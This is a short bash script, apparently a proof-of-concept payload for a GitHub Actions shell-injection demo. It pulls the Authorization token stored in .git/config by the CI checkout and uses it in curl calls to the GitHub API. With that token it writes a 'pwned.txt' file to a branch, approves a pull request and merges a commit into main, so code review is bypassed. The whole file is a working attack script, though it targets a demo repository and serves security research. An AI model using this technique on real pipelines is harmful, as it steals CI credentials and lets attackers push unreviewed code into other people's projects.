#!/usr/bin/env bash

authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)

echo mod
  
# Inject content to a side branch
curl --request PUT \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\", \"branch\": \"minusworld-gha-demo-patch-1\" }"

# Create a PR
# curl --request POST \
#   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/pulls \
#   --header "Authorization: $authfield" \
#   --header "Accept: application/vnd.github.v3+json" \
#   --data '{ "title": "prt-demo", "head": "minusworld-gha-demo-patch-1", "base": "main" }'

# Approve the PR
curl --request POST \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/pulls/22/reviews \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data '{ "event": "APPROVE" }'

# Merge
curl --request POST \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/merges \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data '{ "base": "main", "head": "5130d3d9ebacade0f440e28af9395854ea8b9485" }'
